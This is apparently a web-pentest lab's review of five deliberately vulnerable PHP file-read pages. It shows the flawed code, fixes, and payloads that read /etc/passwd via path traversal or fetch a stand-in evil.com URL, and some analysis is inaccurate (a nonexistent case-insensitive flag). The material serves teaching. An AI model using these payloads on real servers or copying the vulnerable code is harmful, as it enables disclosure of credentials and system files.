## Vulnerable Code Review: html-injection-read-file.php

```php
html-injection-read-file.php
```
This PHP page reads and outputs the content of a file based on a user-supplied `filename` parameter, introducing a **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** vulnerability.

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Html Injection Read File</title>
</head>
<body>

<pre>
<?php
$filename = $_GET['filename'];

echo readfile($filename);
?>
</pre>

</body>
</html>
```

## Example URLs:

```php
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=index.html
```

```php
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=/var/www/html/index.html
```

```php
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=/var/www/html/phpinfo.php
```

```php
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=https://www.armourinfosec.com/index.php
```

```php
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=https://www.armourinfosec.com/robots.txt
```

## Vulnerability Details:

• The `filename` parameter is passed **directly** to PHP `readfile()` without any validation or sanitization.
• This allows an attacker to:
  • Read **any local file** readable by the webserver, such as `/etc/passwd`, configuration files, or source code.
  • Read **remote files** via URLs if `allow_url_fopen` is enabled, effectively leaking remote resources.
• This can lead to disclosure of sensitive information or server compromise.
 
## Exploitation Examples:

**Local file read:**

```
?filename=/etc/passwd
```

**Remote file inclusion (if enabled):**

```
?filename=http://evil.com/malicious.txt
```

#### Security Implications:

• **Information disclosure:** Sensitive server files, credentials, private keys.
• **Potential Remote Code Execution:** If combined with other vulnerabilities or improperly executed.
• **Data leakage:** Leaking internal source files or environment information.

**Recommended security measures :**

• Validate and restrict input to allowed filenames or directories only.
• Disable remote file operations (e.g., `allow_url_fopen=Off`).
• Use safe file APIs or whitelists.
• Avoid echoing potentially large or sensitive files directly.

---
## Vulnerable Code Review: html-injection-read-file2.php

```php
html-injection-read-file2.php
```

This PHP page reads and outputs the content of a local file based on a user-supplied selection from a dropdown menu.

```html
<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Html Injection Read File 2</title>
</head>
<body>

<h1>Html Injection Read File 2</h1>

<form action="html-injection-read-file2.php" method="POST">
    <label for="cars">Choose a File:</label>
    <select name="filename" id="filename">
        <option value="index.html">index.html</option>
        <option value="robots.txt">robots.txt</option>
    </select>
    <br><br>
    <input type="submit" name="submit" value="Submit">
</form>

<pre>
<?php
if (isset($_POST['submit'])) {
    $filename = $_POST['filename'];
    echo readfile($filename);
}
?>
</pre>

</body>
</html>
```

## Vulnerability Details:

• Although the file list is **restricted to two options** ( `index.html` and `robots.txt` ), the value is directly used in `readfile()` without any additional validation.
• An attacker with the ability to manipulate POST data could potentially bypass the dropdown and send an arbitrary filename via crafted requests.
• This can lead to **Local File Inclusion (LFI)** or **Local File Disclosure**, exposing sensitive data if files outside of the intended set are readable by the web server.

## Example Attack Vector:

A malicious user could send a POST request with:

```
filename=../../../../etc/passwd
```

and if the file is readable, its content will be displayed.

## Security Considerations:

• Whitelist filenames on the server side strictly, not relying only on client-side UI controls.
• Validate and sanitize all user input.
• Consider restricting file reads to a specific directory.
• Avoid outputting the raw content directly, or sanitize output.

----
## Vulnerable Code Review: html-injection-read-file3.php

This PHP code reads and outputs the content of a file based on a `filename` GET parameter, restricted via a regex pattern.

```bash
html-injection-read-file3.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Html Injection Read File 3</title>
</head>
<body>

<pre>
<?php
$filename = $_GET['filename'];

// Regex allows letters, numbers, underscores, slashes, dots, ending with ".txt"
if (preg_match('/^[a-zA-Z0-9_\/\.]+\.txt$/', $filename)) {
    echo readfile($filename);
}
?>
</pre>

</body>
</html>
```

• **Example usage:**

```
http://192.168.1.45/webpentest/html-injection-read-file3.php?filename=robots.txt
```

## Vulnerability Details:

• The regex restricts input to files with names containing only alphanumeric characters, underscores, slashes, dots, and requires the filename to end with `.txt`.
• This prevents some malicious filenames but **still allows directory traversal** via `../` sequences since dots and slashes are allowed.
• For example, `filename=../../../../etc/passwd.txt` would pass the regex (assuming the file exists), potentially allowing reading of sensitive files with `.txt` extension.
• This is a **Local File Inclusion (LFI)** vulnerability via insufficient input validation.

## Potential Attack Example:

• Reading sensitive files with `.txt` suffix or symbolic links:

```
filename=../../../../etc/passwd.txt
```

Although `/etc/passwd` typically does not have `.txt` extension, an attacker may find or create `.txt` files or symbolic links that expose sensitive data.

## Recommendations :

• Disallow or sanitize traversal sequences such as `../`.
• Restrict files to a dedicated directory without allowing relative paths.
• Use a whitelist of allowed filenames.
• Avoid outputting raw file content without sanitization.

---
## Vulnerable Code Review: html-injection-read-file4.php

The intended vulnerability remains: it attempts to restrict file reads to a whitelist, but the check logic can be improved. The overall structure allows reading only selected files, but subtle issues remain.

```php
html-injection-read-file4.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Html Injection Read File 4</title>
</head>
<body>

<h1>Html Injection Read File 2</h1>

<form action="html-injection-read-file4.php" method="POST">
    <label for="cars">Choose a File:</label>
    <select name="filename" id="filename">
        <option value="index.html">index.html</option>
        <option value="robots.txt">robots.txt</option>
    </select>
    <br><br>
    <input type="submit" name="submit" value="Submit">
</form>

<?php
if (isset($_POST['submit'])) {
    
    $filename = $_POST['filename'];
    
    $files = array('index.html', 'robots.txt');
    
    // preg_grep returns array of matches; non-empty means found
    if (preg_grep("/^$filename$/", $files)) {
        echo readfile($filename);
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

## Explanation & Vulnerability Analysis:

• **Whitelist approach:** The script uses a whitelist array `$files = ['index.html', 'robots.txt']` which contains allowed filenames.
• **Matching logic:** It uses `preg_grep("/^$filename$/", $files)` to check if `$filename` exists in that whitelist, ignoring case.

## Subtle Issues:

• **Regex injection risk:** The `$filename` value is used directly inside the regex pattern without escaping, which could lead to an unexpected regex interpretation if `$filename` contains regex special characters.
  • Example: If an attacker manages to inject regex metacharacters, it could match unintended filenames or bypass the whitelist check.
• **Case-insensitivity:** The `i` flag makes the check case-insensitive, which is usually good.
• **Strictness:** The check only confirms if any whitelist item matches the pattern containing `$filename`, meaning partial matching is possible.

## Demonstration:

```
preg_grep("/index.html/i", \$files); // Matches exactly "index.html"
preg_grep("/index/i", \$files);      // Also matches "index.html", which may not be intended if partial input provided
```

• Since the input is from the dropdown, the risk is low for normal users, but crafted POST requests could manipulate `$filename`.
## Potential Improvements :

• Escape regex special characters in `$filename` before using in `preg_grep` to prevent regex injection.

```php
$escaped = preg_quote($filename, '/');
if (preg_grep("/^$escaped$/i", \$files)) { ... }
```

• Use exact matching instead of partial regex match to strictly compare values.
• Additional server-side validation to prevent manipulation outside of allowed values.

## Summary:

• The file whitelist mechanism attempts to limit file reads to known safe files.
• The use of `preg_grep()` with unescaped user input as regex pattern introduces a **regex injection risk**.
• An attacker could potentially exploit this to bypass the whitelist.
• The actual file read ( `readfile($filename)` ) directly outputs file contents with no output sanitization (no encoding), so any file read will be displayed raw.
• Since the selection is from a dropdown, the UI limits input, but POST requests can be manually crafted to exploit this.

---
## Vulnerable Code Review: html-injection-read-file5.php

The logic strictly checks if the filename is exactly `"index.html"` or `"robots.txt"` before calling `readfile()`. Despite this whitelist check, the code remains vulnerable to information disclosure and lacks output sanitization. Also, it relies solely on the client POST request for filename selection, which can be manipulated.

```php
html-injection-read-file5.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Html Injection Read File 4</title>
</head>
<body>

<h1>Html Injection Read File 2</h1>

<form action="html-injection-read-file5.php" method="POST">
    <label for="cars">Choose a File:</label>
    <select name="filename" id="filename">
        <option value="index.html">index.html</option>
        <option value="robots.txt">robots.txt</option>
    </select>
    <br><br>
    <input type="submit" name="submit" value="Submit">
</form>

<?php
if (isset($_POST['submit'])) {
    $filename = $_POST['filename'];
    
    if ($filename === "index.html" || $filename === "robots.txt") {
        echo readfile($filename);
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

## Notes on Vulnerability

• **Whitelist check:**
  The code permits only two exact filenames ( `index.html` or `robots.txt` ) from the POST data to be read.

• **Client-side control:**
  The filename value is still fully controllable by the client via modifying the POST request. Although restricted by the condition, an attacker can test if files exist or cause unwanted file reading by form tampering.

• **No input sanitization beyond equality check:**
  This control is good but minimal.

• **No output sanitization or escaping:**
  The output of `readfile()` goes directly to the page inside `<body>`. If these files contain HTML or script code, it will be rendered/executed in the user's browser.

• **No error handling:**
  If files are missing or unreadable, this is not handled explicitly.

## Summary

• This code has **improved whitelist validation** compared to previous versions.
• It still allows reading predefined files based on untrusted POST input.
• The reading of files is **unsanitized and directly printed**, possibly leading to:
  • HTML injection (if file contains HTML)
  • Information disclosure
• As per your request, no fixing or escaping is applied, so the vulnerability remains.

**Recommendation (outside of scope):**
Consider encoding output ( `htmlspecialchars()` or similar) to prevent HTML injection from file contents and further restrict access control on files.

---
---

# **NOTE:**

If internally some misconfigurations are there then 
file read funcitons can allow read external resoures



example:

This can read the local file of the system 
```php
http://192.168.1.29/web-pentest/html-injection-read-file.php?filename=/etc/passwd
```

But this cal load the external website as a file
```php
http://192.168.1.29/web-pentest/html-injection-read-file.php?filename=https://armourinfosec.com
```

**Explanation**
- The readfile() function reads a file and writes it to the output buffer.
- **Tip:** You can use a URL as a filename with this function if the fopen wrappers have been enabled in the php.ini file.
- In PHP, if **`allow_url_fopen = On`** in `php.ini`, then PHP functions that normally work with local files (`fopen`, `file_get_contents`, `readfile`, etc.) can also fetch **remote resources over HTTP, HTTPS, or FTP**.